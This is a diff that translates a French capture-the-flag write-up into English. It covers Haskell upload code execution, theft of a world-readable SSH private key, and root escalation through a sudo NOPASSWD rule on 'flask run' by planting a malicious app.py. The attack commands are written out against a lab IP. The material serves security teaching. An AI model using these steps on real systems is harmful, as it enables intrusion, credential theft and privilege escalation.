@@ -1,24 +1,24 @@
-# Write-up : "Fun With Functional #2" (Privilege Escalation vers root)
+# Write-up : "Fun With Functional #2" (Privilege Escalation to root)
 
-**Cible :** 10.10.0.43
+**Target:** 10.10.0.43
 
-**Difficulté :** Easy
+**Difficulty:** Easy
 
-**Date :** 16/09/2026
+**Date:** 16/09/2026
 
-**Objectif :** root.txt
+**Objective:** root.txt
 
-**Techniques utilisées :** Upload de fichier malveillant, exécution de code arbitraire (RCE), énumération post-exploitation, vol de clé SSH, escalade de privilèges via sudo
+**Techniques used:** Malicious file upload, arbitrary code execution (RCE), post-exploitation enumeration, SSH key theft, privilege escalation via sudo
 
-**Outils utilisés :** curl, ssh
+**Tools used:** curl, ssh
 
-> Ce challenge est la suite directe de "Fun With Functional". Le point d'entrée (upload Haskell -> exécution de code en tant que `www-data`) est identique. Ce write-up se concentre sur l'étape supplémentaire : passer de `www-data` à `root`.
+> This challenge is the direct continuation of "Fun With Functional". The entry point (Haskell upload -> code execution as `www-data`) is identical. This write-up focuses on the additional step: going from `www-data` to `root`.
 
 ---
 
-## 1. Confirmation du point d'entrée déjà connu
+## 1. Confirming the already known entry point
 
-Comme sur le premier challenge, le serveur web (port 5001) accepte l'upload d'un fichier Haskell (`.hs`), le compile avec GHC, puis exécute le résultat. On réutilise directement le payload RCE :
+As in the first challenge, the web server (port 5001) accepts uploading a Haskell file (`.hs`), compiles it with GHC, then executes the result. We directly reuse the RCE payload:
 
 ```bash
 cat > exploit.hs << 'EOF'
@@ -34,15 +34,15 @@ curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
 curl -s http://10.10.0.43:5001/uploads/exploit.hs
 ```
 
-**Résultat :** confirmation d'une exécution de commande en tant que `uid=33(www-data)`.
+**Result:** confirmation of command execution as `uid=33(www-data)`.
 
 ---
 
-## 2. Reconnaissance du système en tant que www-data
+## 2. System reconnaissance as www-data
 
-Avec l'exécution de commande, on explore le système à la recherche d'un chemin d'escalade.
+With command execution, we explore the system looking for an escalation path.
 
-**Ce que fait cette commande :** on utilise `readProcessWithExitCode` (plutôt que `readProcess`) car cette variante capture aussi bien la sortie normale que les erreurs, même quand la commande échoue (`readProcess` seul provoque une exception Haskell non gérée si le code de sortie n'est pas 0, ce qui empêche de voir le résultat).
+**What this command does:** we use `readProcessWithExitCode` (rather than `readProcess`) because this variant captures both normal output and errors, even when the command fails (`readProcess` alone raises an unhandled Haskell exception if the exit code isn't 0, which prevents seeing the result).
 
 ```bash
 cat > exploit.hs << 'EOF'
@@ -59,18 +59,18 @@ curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
 curl -s http://10.10.0.43:5001/uploads/exploit.hs
 ```
 
-**Découvertes clés :**
+**Key findings:**
 
-1. La liste des processus (`ps aux`) montre que le serveur Flask lui-même est lancé par root via `sudo -u www-data python3 /var/www/html/app.py` - comportement normal de démarrage, pas exploitable directement.
-2. Le dossier `/home/prof/.ssh` contient une clé privée SSH (`id_rsa`) lisible par tout le monde (permissions `rw-r--r--` au lieu de `rw-------` attendu). C'est une mauvaise configuration classique : une clé privée SSH ne devrait jamais être lisible par un autre utilisateur que son propriétaire.
+1. The process list (`ps aux`) shows that the Flask server itself is launched by root via `sudo -u www-data python3 /var/www/html/app.py` - normal startup behavior, not directly exploitable.
+2. The `/home/prof/.ssh` folder contains a private SSH key (`id_rsa`) readable by everyone (permissions `rw-r--r--` instead of the expected `rw-------`). This is a classic misconfiguration: a private SSH key should never be readable by a user other than its owner.
 
 ---
 
-## 3. Vol de la clé privée SSH et pivot vers l'utilisateur `prof`
+## 3. Stealing the private SSH key and pivoting to the `prof` user
 
-**Faille exploitée :** Permissions de fichier trop permissives sur une clé privée (CWE-276 : Incorrect Default Permissions). N'importe quel utilisateur du système (ici `www-data`, via notre RCE) peut lire cette clé privée et s'en servir pour se connecter à la place de son propriétaire légitime.
+**Vulnerability exploited:** Overly permissive file permissions on a private key (CWE-276: Incorrect Default Permissions). Any user on the system (here `www-data`, via our RCE) can read this private key and use it to log in as its legitimate owner.
 
-### Récupération de la clé
+### Retrieving the key
 
 ```bash
 cat > exploit.hs << 'EOF'
@@ -86,16 +86,16 @@ curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
 curl -s http://10.10.0.43:5001/uploads/exploit.hs
 ```
 
-Le contenu complet de la clé privée RSA s'affiche dans la réponse.
+The full content of the RSA private key is displayed in the response.
 
-### Utilisation de la clé pour se connecter en SSH
+### Using the key to connect via SSH
 
-On sauvegarde la clé récupérée dans un fichier local, en lui donnant les permissions strictes que SSH exige (`chmod 600` - sinon SSH refuse de l'utiliser, la considérant comme non sécurisée) :
+We save the retrieved key to a local file, giving it the strict permissions SSH requires (`chmod 600` - otherwise SSH refuses to use it, considering it insecure):
 
 ```bash
 cat > prof_key << 'EOF'
 -----BEGIN RSA PRIVATE KEY-----
-[... contenu de la clé récupérée ...]
+[... content of the retrieved key ...]
 -----END RSA PRIVATE KEY-----
 EOF
 
@@ -103,36 +103,36 @@ chmod 600 prof_key
 ssh -i prof_key prof@10.10.0.43
 ```
 
-**Résultat :** connexion SSH interactive réussie en tant qu'utilisateur `prof`.
+**Result:** successful interactive SSH connection as the `prof` user.
 
 ---
 
-## 4. Escalade de privilèges de prof vers root
+## 4. Privilege escalation from prof to root
 
-Une fois connecté en tant que `prof`, on vérifie ses droits d'exécution en tant que root :
+Once connected as `prof`, we check our root execution rights:
 
 ```bash
 sudo -l
 ```
 
-**Résultat :**
+**Result:**
 
 ```
 User prof may run the following commands on lambda:
     (root) NOPASSWD: /usr/local/bin/flask run
 ```
 
-**Explication :** cette règle sudo autorise `prof` à exécuter la commande exacte `/usr/local/bin/flask run` en tant que root, sans avoir besoin de mot de passe (`NOPASSWD`). `flask` est l'outil en ligne de commande du framework web Flask ; sa sous-commande `run` démarre un serveur web à partir d'une application Python. Le problème : Flask a besoin de savoir quel fichier Python charger comme application, et cette information peut être fournie de plusieurs façons, dont une que la règle sudo ne bloque pas.
+**Explanation:** this sudo rule allows `prof` to run the exact command `/usr/local/bin/flask run` as root, without needing a password (`NOPASSWD`). `flask` is the command-line tool of the Flask web framework; its `run` subcommand starts a web server from a Python application. The problem: Flask needs to know which Python file to load as the application, and this information can be provided in several ways, one of which the sudo rule doesn't block.
 
-**Faille exploitée :** Détournement de binaire autorisé via sudo (Sudo Privilege Escalation / GTFOBins-style). La règle sudo n'autorise que la commande `flask run` sans arguments supplémentaires (ajouter `--app monfichier.py` change la ligne de commande et sudo la refuse). Mais Flask a une convention par défaut : s'il ne reçoit aucune indication explicite, il cherche automatiquement un fichier nommé `app.py` dans le dossier courant. Cette convention permet de contourner la restriction : on place notre propre fichier malveillant nommé exactement `app.py` dans le dossier où l'on exécute la commande, et Flask (donc root) le charge et l'exécute sans qu'on ait eu besoin de modifier la ligne de commande autorisée par sudo.
+**Vulnerability exploited:** Hijacking an allowed binary via sudo (Sudo Privilege Escalation / GTFOBins-style). The sudo rule only allows the `flask run` command with no additional arguments (adding `--app myfile.py` changes the command line and sudo refuses it). But Flask has a default convention: if it receives no explicit instruction, it automatically looks for a file named `app.py` in the current folder. This convention allows bypassing the restriction: we place our own malicious file named exactly `app.py` in the folder where we run the command, and Flask (i.e. root) loads and executes it without us needing to modify the command line allowed by sudo.
 
-### Création du fichier Python malveillant
+### Creating the malicious Python file
 
-**Explication du code :** quand Python importe/charge un fichier, tout le code écrit au niveau supérieur (pas dans une fonction) s'exécute immédiatement, avant même que Flask ne démarre son serveur web. On profite de ce moment pour :
+**Explanation of the code:** when Python imports/loads a file, all the code written at the top level (not inside a function) runs immediately, even before Flask starts its web server. We use this moment to:
 
-- lire le fichier `/root/root.txt` (normalement inaccessible à `prof`) et copier son contenu dans `/tmp/root_flag.txt`, un emplacement qu'on pourra relire ensuite en tant que `prof`.
-- rendre ce fichier de sortie lisible par tous (`chmod 644`), puisqu'il vient d'être créé par root et serait sinon inaccessible à `prof`.
-- le reste du fichier (la partie Flask) n'est là que pour que le fichier reste un minimum valide et ne fasse pas planter la commande `flask run`.
+- read the file `/root/root.txt` (normally inaccessible to `prof`) and copy its content to `/tmp/root_flag.txt`, a location we can then read back as `prof`.
+- make this output file readable by everyone (`chmod 644`), since it was just created by root and would otherwise be inaccessible to `prof`.
+- the rest of the file (the Flask part) is only there so the file stays minimally valid and doesn't crash the `flask run` command.
 
 ```bash
 cat > /tmp/evil.py << 'EOF'
@@ -149,9 +149,9 @@ def home():
 EOF
 ```
 
-### Placement du fichier et exécution
+### Placing the file and executing
 
-Dès que la commande se lance, Flask charge automatiquement `app.py` depuis le dossier courant (`/home/prof`), exécutant notre code malveillant avec les pleins droits root, avant même que le serveur web ne démarre réellement.
+As soon as the command runs, Flask automatically loads `app.py` from the current folder (`/home/prof`), executing our malicious code with full root rights, even before the web server actually starts.
 
 ```bash
 cp /tmp/evil.py /home/prof/app.py
@@ -160,65 +160,65 @@ sudo /usr/local/bin/flask run &
 sleep 3
 ```
 
-### Récupération du flag
+### Retrieving the flag
 
 ```bash
 cat /tmp/root_flag.txt
 ```
 
-Le contenu de `/root/root.txt` s'affiche : c'est le flag final recherché.
+The content of `/root/root.txt` is displayed: this is the final flag we were looking for.
 
 ```
-EPI{TODO_remplacer_par_le_flag_reellement_obtenu}
+EPI{TODO_replace_with_the_actually_obtained_flag}
 ```
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| #   | Faille                                         | Type / Catégorie                             | Explication courte                                                                                                                                                           |
-| --- | ---------------------------------------------- | -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 1   | Upload et exécution de code Haskell arbitraire | Unrestricted Upload / RCE (CWE-434)          | Point d'entrée initial, obtention d'un shell en tant que `www-data`                                                                                                          |
-| 2   | Clé SSH privée lisible par tout le monde       | Incorrect Default Permissions (CWE-276)      | Permet de voler l'identité de l'utilisateur `prof` sans connaître son mot de passe                                                                                           |
-| 3   | Règle sudo trop permissive sur `flask run`     | Sudo Misconfiguration / Privilege Escalation | La convention de chargement par défaut de Flask (`app.py` dans le dossier courant) permet d'exécuter du code arbitraire en root sans modifier la ligne de commande autorisée |
+| #   | Vulnerability                                    | Type / Category                              | Short explanation                                                                                                                                                            |
+| --- | -------------------------------------------------- | --------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1   | Upload and execution of arbitrary Haskell code     | Unrestricted Upload / RCE (CWE-434)          | Initial entry point, obtaining a shell as `www-data`                                                                                                                        |
+| 2   | Private SSH key readable by everyone               | Incorrect Default Permissions (CWE-276)      | Allows stealing the `prof` user's identity without knowing their password                                                                                                   |
+| 3   | Overly permissive sudo rule on `flask run`         | Sudo Misconfiguration / Privilege Escalation | Flask's default loading convention (`app.py` in the current folder) allows executing arbitrary code as root without modifying the command line allowed by sudo             |
 
 ---
 
-## Chaîne d'exploitation complète (résumé visuel)
+## Full exploitation chain (visual summary)
 
 ```
-Upload fichier .hs malveillant
+Upload of a malicious .hs file
         |
         v
-Exécution de commande en tant que www-data
+Command execution as www-data
         |
         v
-Lecture de la clé SSH privée de "prof" (permissions trop ouvertes)
+Reading "prof"'s private SSH key (permissions too open)
         |
         v
-Connexion SSH en tant que "prof" avec la clé volée
+SSH connection as "prof" with the stolen key
         |
         v
-sudo -l révèle : NOPASSWD sur "flask run"
+sudo -l reveals: NOPASSWD on "flask run"
         |
         v
-Dépôt d'un app.py malveillant dans le dossier courant
+Dropping a malicious app.py in the current folder
         |
         v
-"sudo flask run" exécute notre code en tant que root
+"sudo flask run" executes our code as root
         |
         v
-Lecture de /root/root.txt (flag final)
+Reading /root/root.txt (final flag)
 ```
 
 ---
 
 ## Conclusion
 
-- **Accès initial :** RCE via upload de fichier Haskell non sandboxé → shell en tant que `www-data`.
-- **Pivot :** vol d'une clé SSH privée mal protégée → accès `prof`.
-- **Escalade de privilèges :** détournement de la règle sudo `NOPASSWD: flask run` via la convention de chargement `app.py` de Flask → exécution de code en root.
-- **Flag root :** obtenu dans `/root/root.txt`.
+- **Initial access:** RCE via upload of a non-sandboxed Haskell file → shell as `www-data`.
+- **Pivot:** theft of a poorly protected private SSH key → access as `prof`.
+- **Privilege escalation:** hijacking the sudo rule `NOPASSWD: flask run` via Flask's `app.py` loading convention → code execution as root.
+- **Root flag:** obtained in `/root/root.txt`.
 
 ---
 
